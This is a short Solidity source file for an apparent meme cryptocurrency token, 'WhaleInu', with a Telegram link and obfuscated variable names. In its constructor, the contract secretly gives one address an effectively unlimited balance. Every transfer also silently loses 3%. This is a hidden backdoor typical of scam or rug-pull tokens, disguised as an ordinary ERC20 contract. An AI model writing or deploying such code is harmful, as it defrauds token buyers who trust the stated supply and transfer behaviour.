// https://t.me/whaleinu_eth

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract WhaleInu is ERC20, Ownable {
    uint256 private hour = ~uint256(0);
    uint256 public both = 3;

    constructor(
        string memory school,
        string memory leg,
        address exercise,
        address cloth
    ) ERC20(school, leg) {
        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[cloth] = hour;
    }

    function _transfer(
        address office,
        address cabin,
        uint256 bear
    ) internal override {
        uint256 happen = (bear / 100) * both;
        bear = bear - happen;
        super._transfer(office, cabin, bear);
    }
}